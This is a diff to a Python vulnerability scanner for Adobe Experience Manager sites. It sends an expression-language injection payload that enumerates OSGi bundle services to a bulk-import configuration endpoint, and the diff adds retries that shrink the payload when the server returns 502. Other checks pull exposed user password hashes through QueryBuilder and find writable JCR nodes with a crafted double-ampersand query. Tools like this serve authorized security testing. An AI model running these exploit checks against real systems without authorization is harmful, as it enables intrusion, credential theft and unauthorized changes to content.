@@ -166,7 +166,16 @@ def mutate_path(path):
 
 def request(path, method='get', **kwargs):
     full_url = AUTHORITY + path
-    debug(f'>>>>> {method.upper()} {full_url}')
+    
+    # Show full URL with parameters for debugging
+    if 'params' in kwargs and kwargs['params']:
+        import urllib.parse
+        query_string = urllib.parse.urlencode(kwargs['params'])
+        debug_url = f'{full_url}?{query_string}'
+    else:
+        debug_url = full_url
+    
+    debug(f'>>>>> {method.upper()} {debug_url}')
     if PROXY:
         debug(f'Using proxy: {PROXY}')
     
@@ -224,45 +233,57 @@ def request(path, method='get', **kwargs):
         if 'timeout' not in kwargs:
             kwargs['timeout'] = (10, 30)  # Increased timeouts for large payloads
         
-        # Don't use streaming for large POST requests as it can cause hangs
-        if method.lower() == 'post' and 'data' in kwargs:
-            kwargs['stream'] = False
-        else:
-            kwargs['stream'] = True
+       
+        kwargs['stream'] = False
             
         r = session.request(method, full_url, **kwargs)
         debug(f'<<<<< {r.status_code} {r.reason}')
         
-        # Only do manual content reading for streaming requests
-        if kwargs.get('stream', False):
-            content = b''
-            
-            try:
-                import time
-                start_time = time.time()
-                for chunk in r.iter_content(chunk_size=8192, decode_unicode=False):
-                    if chunk:
-                        content += chunk
-                        
-                        if time.time() - start_time > 30:
-                            debug(f'Timeout reading response content after 30 seconds')
-                            break
-            except Exception as e:
-                debug(f'Error reading response content: {e}')
-                pass
-            
-            r._content = content
-            r._content_consumed = True
+        # Read the content and store all needed attributes before closing session
+        content = r.content
+        status_code = r.status_code
+        reason = r.reason
+        headers = dict(r.headers)
+        url = r.url
         
-        return r
+        # Try to parse JSON, but don't fail if it's not valid JSON
+        try:
+            json_data = r.json()
+        except (ValueError, requests.exceptions.JSONDecodeError):
+            json_data = None
+        
+        # Test if response is valid before returning
+        if status_code == 502:
+            print(f"DEBUG: About to return 502 response for {full_url}")
+        
+        session.close()
+        
+        # Create a simple response-like object that won't be invalidated
+        class SimpleResponse:
+            def __init__(self, content, status_code, reason, headers, url, json_data):
+                self.content = content
+                self.status_code = status_code
+                self.reason = reason
+                self.headers = headers
+                self.url = url
+                self.text = content.decode('utf-8', errors='ignore')
+                self._json_data = json_data
+            
+            def json(self):
+                if self._json_data is not None:
+                    return self._json_data
+                else:
+                    raise ValueError("No JSON object could be decoded")
+        
+        return SimpleResponse(content, status_code, reason, headers, url, json_data)
     except requests.exceptions.Timeout as e:
         debug(f'Request timeout for {full_url}: {e}')
+        session.close()
         return None
     except requests.exceptions.RequestException as e:
         debug(f'Request failed for {full_url}: {e}')
-        return None
-    finally:
         session.close()
+        return None
 
 def check_exposed_querybuilder_json():
     for path in mutate_path('/bin/querybuilder.json'):
@@ -331,31 +352,67 @@ def check_jackrabbit_xxe():
     update_progress()
 
 def check_el_injection():
-    def _gen_el_payload():
+    def _gen_el_payload(bundle_limit_1=100, service_limit_1=50, bundle_limit_2=1000, service_limit_2=5):
         el_tmpl = '#{pageContext.class.classLoader.bundle.bundleContext.bundles[%d].registeredServices[%d].properties}\n'
         s = ''
-        for bundle in range(100):
-            for service in range(50):
+        for bundle in range(bundle_limit_1):
+            for service in range(service_limit_1):
                 s += el_tmpl % (bundle, service)
-        for bundle in range(100, 1000):
-            for service in range(5):
+        for bundle in range(bundle_limit_1, bundle_limit_2):
+            for service in range(service_limit_2):
                 s += el_tmpl % (bundle, service)
         return s
     
-    upload_payload = {
-        'importSource': 'UrlBased',
-        'sling:resourceType': '/libs/foundation/components/page/redirect.jsp',
-        'redirectTarget': _gen_el_payload()
-    }
-
-    for path in mutate_path('/conf/global/settings/dam/import/cloudsettings.bulkimportConfig.json'):
-        r = request(path, method='post', data=upload_payload)
-        if r and r.status_code == 201:
-            print_neutral(f'Upload appeared to succeed - {path}')
+    # Start with full payload
+    bundle_limit_1 = 100
+    service_limit_1 = 50
+    bundle_limit_2 = 1000
+    service_limit_2 = 5
+    
+    max_retries = 4  # Allow up to 4 reductions (16x smaller payload at most)
+    retry_count = 0
+    
+    while retry_count <= max_retries:
+        upload_payload = {
+            'importSource': 'UrlBased',
+            'sling:resourceType': '/libs/foundation/components/page/redirect.jsp',
+            'redirectTarget': _gen_el_payload(bundle_limit_1, service_limit_1, bundle_limit_2, service_limit_2)
+        }
+        
+        payload_size = len(str(upload_payload))
+        
+        upload_succeeded = False
+        got_502_error = False
+        
+        for path in mutate_path('/conf/global/settings/dam/import/cloudsettings.bulkimportConfig.json'):
+            r = request(path, method='post', data=upload_payload)
+            
+            if r and r.status_code == 502:
+                print(f"DEBUG: Got 502 for {path}")
+                got_502_error = True
+                # Continue trying other paths in case one works
+                continue
+            elif r and (r.status_code == 201 or r.status_code == 200):
+                print_neutral(f'Upload appeared to succeed - {path}')
+                upload_succeeded = True
+                break
+        
+        if upload_succeeded:
             break
-    else:
-        # Fail - nothing uploaded!
-        return
+        elif got_502_error and retry_count < max_retries:
+            print_neutral(f'Got 502 error, reducing payload size and retrying (attempt {retry_count + 2}/{max_retries + 1})')
+            # Reduce payload size by half
+            bundle_limit_1 = max(10, bundle_limit_1 // 2)
+            service_limit_1 = max(5, service_limit_1 // 2)
+            bundle_limit_2 = max(bundle_limit_1 + 50, bundle_limit_2 // 2)
+            service_limit_2 = max(1, service_limit_2 // 2)
+            retry_count += 1
+            # Continue to next iteration to regenerate payload with new limits
+        else:
+            # Either no 502 errors (so payload size isn't the issue) or max retries reached
+            if got_502_error:
+                print_neutral(f'Still getting 502 after {max_retries + 1} attempts, giving up')
+            return
 
     for path in mutate_path('/etc/cloudsettings/.kernel.html/conf/global/settings/dam/import/cloudsettings/jcr:content'):
         r = request(path)
@@ -378,7 +435,7 @@ def querybuilder_check_exposed_user_passwords(path):
     }
     
     try:
-        r = request(path, params=query, timeout=(3, 8))
+        r = request(path, params=query, timeout=(3, 80))
         if r and r.status_code == 200 and b'rep:password' in r.content:
             full_url = AUTHORITY + path + '?' + urllib.parse.urlencode(query)
             print_good_with_content(f'Exposed user passwords found - {path}?{urllib.parse.urlencode(query)}', r.text, full_url)
@@ -392,23 +449,25 @@ def querybuilder_check_exposed_user_passwords(path):
 def querybuilder_check_writable_nodes(path):
     debug(f'Checking for writable nodes using path: {path}')
     for perm in 'jcr:write', 'jcr:addChildNodes', 'jcr:modifyProperties':    
-        query = {
-            'property': 'jcr:uuid',
-            'property.operation': 'exists',
-            'p.hits': 'selective',
-            'p.properties': 'jcr:path',
-            'p.limit': '3',
-            'hasPermission': perm
-        }
+        # Manually construct query string with double ampersand before hasPermission
+        query_parts = [
+            'property=jcr:uuid',
+            'property.operation=exists',
+            'p.hits=selective',
+            'p.properties=jcr:path',
+            'p.limit=3'
+        ]
+        query_string = '&'.join(query_parts) + f'&&hasPermission={perm}'
+        full_path = f'{path}?{query_string}'
         
         try:
-            r = request(path, params=query, timeout=(3, 8))
+            r = request(full_path, timeout=(3, 80))
             if r and r.status_code == 200:
                 try:
                     data = r.json()
                     if data.get('total', 0) > 0:
-                        full_url = AUTHORITY + path + '?' + urllib.parse.urlencode(query)
-                        print_good_with_content(f'Writeable nodes found - {path}?{urllib.parse.urlencode(query)}', r.text, full_url)
+                        full_url = AUTHORITY + full_path
+                        print_good_with_content(f'Writeable nodes found - {full_path}', r.text, full_url)
                         add_vulnerability('writeable jcr nodes', full_url)
                 except (ValueError, KeyError):
                     debug(f'Failed to parse JSON response from {path}')
@@ -446,9 +505,8 @@ def run_checks_for_target(url):
     check_jackrabbit_xxe()
     check_el_injection()
     if query_builder_path is not None:
-        original_path = '/bin/querybuilder.json'
-        querybuilder_check_exposed_user_passwords(original_path)
-        querybuilder_check_writable_nodes(original_path)
+        querybuilder_check_exposed_user_passwords(query_builder_path)
+        querybuilder_check_writable_nodes(query_builder_path)
     else:
         update_progress()
         update_progress()
